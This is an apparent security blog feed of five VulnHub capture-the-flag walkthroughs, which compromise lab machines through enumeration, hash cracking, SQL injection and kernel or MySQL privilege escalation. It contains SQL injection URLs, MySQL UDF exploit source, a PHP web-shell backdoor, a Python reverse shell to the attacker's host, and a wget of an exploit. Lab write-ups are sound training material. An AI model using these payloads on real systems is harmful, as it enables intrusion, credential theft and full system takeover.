<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-08-22T15:11:59-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[the wall]]></title>
    <link href="http://wg135.github.io/blog/2016/08/18/the-wall/"/>
    <updated>2016-08-18T14:23:31-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/18/the-wall</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wireshark</li>
<li>Netcat</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Hash-identifier</li>
<li>Hashcat</li>
<li>Steghide</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.162 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.162 -p-</code></p>

<p>However, no port is opening.</p>

<p>use wireshark to check the traffic</p>

<p><img src="/images/blog/vulhub/wall/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>find the target send packet to TCP port 1337 in my Kali.</p>

<p><code>nc -nlvp 1337</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>nothing cool shows.</p>

<p>rerun nmap, find port 80 is opening now</p>

<p><img src="/images/blog/vulhub/wall/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wfuzz and nikto and find nothing.</p>

<p><img src="/images/blog/vulhub/wall/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The webpage just show a image. check the source code:</p>

<p><img src="/images/blog/vulhub/wall/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting string. <code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></p>

<p>use Hash-identifier cannot figure out what&rsquo;s encode type. Finally, I find it is hex encode in hackbar. Hex decode to character, get</p>

<p><code>steg=33115730dbbb370fcbe9720fe632ec05</code></p>

<p>use Hash-identifier to find out <code>33115730dbbb370fcbe9720fe632ec05</code> is a MD5</p>

<p><img src="/images/blog/vulhub/wall/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>use hashcat to crack it.</p>

<p><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get password is <code>divisionbell</code></p>

<p>Now I want to check the image to see if there is any hiden information</p>

<p><code>steghide extract -p divisionbell -sf pink_floyd.jpg</code></p>

<p>get the result:</p>

<p><img src="/images/blog/vulhub/wall/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code> is very interesting. <code>|</code> separates the string into two parts.</p>

<p><code>U3lkQmFycmV0dA==</code> is base64 encoded, decode it, <code>SydBarrett</code></p>

<p><code>f831605ae34c2399d1e5bb3a4ab245d0</code> is MD5. crack it.</p>

<p><img src="/images/blog/vulhub/wall/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>its <code>pinkfloydrocks</code></p>

<p>now what, remember enumerate, enumerate and enumerate.</p>

<p>rerun nmap again,</p>

<p><img src="/images/blog/vulhub/wall/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1965 is opening and running ssh</p>

<p>login using SydBarrett/pinkfloydrocks.</p>

<p><img src="/images/blog/vulhub/wall/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>shows This service allows sftp connections only</p>

<p>use sftp to login</p>

<p><code>sftp -P 1965 SydBarrett@192.168.41.162</code></p>

<p>check the files</p>

<p><code>sftp&gt; ls -ahl</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/wall/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>check the file eclipsed_by_the_moon</p>

<p><img src="/images/blog/vulhub/wall/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>tar zxvf eclipsed_by_the_moon</code></p>

<p><code>foremost -v -i eclipsed_by_the_moon.lsd</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>got a jpg file. <code>Roger Waters</code></p>

<p>open it</p>

<p><img src="/images/blog/vulhub/wall/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>and his password is <code>hello_is_there_anybody_in_there</code></p>

<p>based on previous username <code>SydBarrett</code>, Roger Waters user name should be <code>RogerWaters</code></p>

<p><code>ssh RogerWaters@192.168.41.162 -p 1965</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>check sticky bit set</p>

<pre><code>find / -perm -u=s -type f -user DavidGilmour 2&gt;/dev/null
find / -perm -u=s -type f -user NickMason 2&gt;/dev/null
ls -al /usr/local/bin/shineon 
ls -al /usr/local/bin/brick
</code></pre>

<p><img src="/images/blog/vulhub/wall/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>/usr/local/bin/brick</code> has sticky bit set.</p>

<p>run it</p>

<p><code>/usr/local/bin/brick</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord the Root]]></title>
    <link href="http://wg135.github.io/blog/2016/08/12/lord-the-root/"/>
    <updated>2016-08-12T13:50:04-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/12/lord-the-root</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/39166/">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &lsquo;overlayfs&rsquo; Local Root Exploit (1)</a></li>
<li><a href="https://www.exploit-db.com/exploits/1518/">MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/lordroot/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.159 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.159 -p-</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 22 is opening.</p>

<p>try to ssh to the box and check the banner</p>

<p><code>ssh root@192.168.41.159</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a hint Easy as 1,2,3</p>

<p>looks like port knocking, now try to send packet to port 1, 2 and 3 using <a href="https://github.com/wg135/script/blob/master/port_knocking.py">port knocking</a> script.</p>

<p>run nmap again,</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1337 is openning and it is running http service.</p>

<p>I used both nikto and wfuzz, nothing interesting come out.</p>

<p>check the page</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>check the image info,</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an <code>/images/</code>, go to the directory.</p>

<p>nothing cool. check the source code find a <code>/icons/</code>.</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check <code>http://192.168.41.159:1337/robots.txt</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>I check <code>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</code> and it is base64 encoded.</p>

<p>Decode it in hackbar, I get:</p>

<p><code>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></p>

<p>This is also base64 encoded.</p>

<p>Decode it again,</p>

<p><code>/978345210/index.php</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>save the post requst in burpsuit as file post.txt</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>username is vulnerable.</p>

<p>get table name</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables</code></p>

<p>webapp database
<img src="/images/blog/vulhub/lordroot/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql
<img src="/images/blog/vulhub/lordroot/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get columns of webapp</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>dump username and password</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get colums of table user</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>try to login web using credential, however, I cannot find anywhere to upload webshell.</p>

<p>I try the credential to login ssh</p>

<p>and <code>smeagol  | MyPreciousR00t</code> works</p>

<h3>Local exploit 1:</h3>

<p><code>uname -a</code></p>

<p>then get:</p>

<p><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</code></p>

<p><code>searchsploit Linux Kernel | grep Ubuntu</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<pre><code>wget http://192.168.41.149/39166.c
gcc 39166.c -o local
./local
</code></pre>

<p>get the root</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<h3>Local exploit 2:</h3>

<p><code>ps aux |grep root</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql is running under the root, which is wrong!</p>

<p>login mysql</p>

<p><code>mysql -u root -p</code>, password is <code>darkshadow</code>, and the mysql version is 5.5.44.</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit mysql | grep local</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>

<p>use the c code:(1518.c)</p>

<pre><code class="c">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args-&gt;arg_count != 1)
        return(0);

    system(args-&gt;args[0]);

    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
</code></pre>

<pre><code>gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
</code></pre>

<p>in mysql</p>

<pre><code>mysql&gt; use mysql
mysql&gt; create table foo(line blob);
mysql&gt; insert into foo values(load_file('/tmp/1518.so'));
mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
mysql&gt; create function do_system returns integer soname '1518.so';
mysql&gt; select * from mysql.func;
mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
mysql&gt; \! sh
$ cat /tmp/out
</code></pre>

<p><img src="/images/blog/vulhub/lordroot/Selection_024.png" title="[title manually exploit [alt text]]" ></p>

<p>exploit is good. now use <a href="https://github.com/wg135/script/blob/master/suid.c">suid.c</a></p>

<p>in mysql:</p>

<pre><code>mysql&gt; select do_system('gcc -o /tmp/suid /tmp/suid.c');
mysql&gt; select do_system('chmod u+s /tmp/suid');
</code></pre>

<p>in /tmp</p>

<p><code>./suid</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_025.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic RTB2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
    <updated>2016-08-10T15:38:10-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
<li>Metasploit</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.158 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like port 80 is opening and port 666 is filtered.</p>

<p>Use both wfuzz to scan the host</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>phpmyadmin</code></p>

<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>

<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz scan again</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check the webpage <code>http://192.168.41.158:666/</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it is joomla</p>

<p>now use Joomba to scan the app</p>

<p><code>joomscan -u http://192.168.41.158:666/</code></p>

<p>nothing cool comes out.</p>

<p>use metasploit</p>

<p><code>search joomla</code></p>

<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>

<pre><code>msf &gt; use auxiliary/scanner/http/joomla_plugins
msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
msf auxiliary(joomla_plugins) &gt; set rport 666
msf auxiliary(joomla_plugins) &gt; run
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p>so first step, verify the sql injection:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to get column number:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>the column number is 2</p>

<p>next find out which column we can use</p>

<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Column 2</p>

<p>try to check mysql version</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get all table name</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get all column name of table jos_users</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>next, get column username and password:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>The format is hash:salt</p>

<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<pre><code>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
</code></pre>

<p>for administrator, I didn&rsquo;t get the password</p>

<p>for JSmith, password is matrix, for BTallor, password is victim.</p>

<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>find the username/password. Use it login phpmyadmin</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now I will create a backdoor using mysql:</p>

<pre><code>create database pwn;
create table backdoor(script text);
insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
select * into outfile "/var/www/backdoor3.php" from backdoor;
</code></pre>

<p>check the backdoor.</p>

<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>good.</p>

<p>Setup netcat and</p>

<pre><code>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p><code>uname -a</code></p>

<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[hackademic:rtb1]]></title>
    <link href="http://wg135.github.io/blog/2016/08/03/hackademic-rtb1/"/>
    <updated>2016-08-03T10:30:58-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/03/hackademic-rtb1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Wpscan</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/rtb1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.157 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.157 -p-</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use both wfuzz and nikto to scan the host, nothing interesting&hellip;</p>

<p>Check the page,</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a link <code>http://192.168.41.157/Hackademic_RTB1/</code></p>

<p>use wfuzz to scan:</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>There is a wordpress.</p>

<p>use wpscan to scan</p>

<p><code>wpscan http://192.168.41.157/Hackademic_RTB1/</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>There are a couple of exploits, I tried both of them and no luck.</p>

<p>Enumerate the page, find a possible SQL injection potint:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0'</code></p>

<p>looks like parameter cat is vulnerable</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>next try:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>keep trying until</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>got error. Now I know the current table in user by the vulnerable page has 5 columns.</p>

<p>next</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now I can use second column to do injection.</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>next use sqlmap to get all tables,</p>

<p><code>sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3</code></p>

<p>get table names:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>I want to check table <code>wp_users</code></p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>dump these two columns</p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>now we can edit php webshell via plugin</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>Only textile1.php can be updated. Use that file to edit shell.</p>

<p>Setup netcat, and load <code>http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php</code></p>

<p>get shell</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><code>uname -a</code></p>

<p>get the <code>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</code></p>

<p>I tried serveral local exploits and find this one works:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Droopy:V0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2/"/>
    <updated>2016-08-01T10:57:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>droopescan</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/34992/">Drupal HTTP Parameter Key/Value SQL Injection</a></li>
<li><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/drooy2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.155 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.155 -p-</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.155</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>No useful info come out.</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/drooy2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>still same thing.</p>

<p>check the <a href="http://192.168.41.155">http://192.168.41.155</a></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target use <code>Drupal</code></p>

<h3>Use Metasploit</h3>

<p>in msfconsole, search drupal, find an interesting exploit <code>exploit/multi/http/drupal_drupageddon</code></p>

<pre><code>msf &gt; use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) &gt; set rhost 192.168.41.155
msf exploit(drupal_drupageddon) &gt; exploit 
</code></pre>

<p><img src="/images/blog/vulhub/drooy2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get meterpreter, do command <code>shell</code> to get shell.</p>

<p>use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> get bash</p>

<p>user is www-data, next try to get root</p>

<p><code>uname -a</code></p>

<p><code>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></p>

<p>the kernel is 3.1.30</p>

<p><code>searchsploit 3.1.30</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>upload the exploit, compile and run it, get the root:</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<h3>Another way</h3>

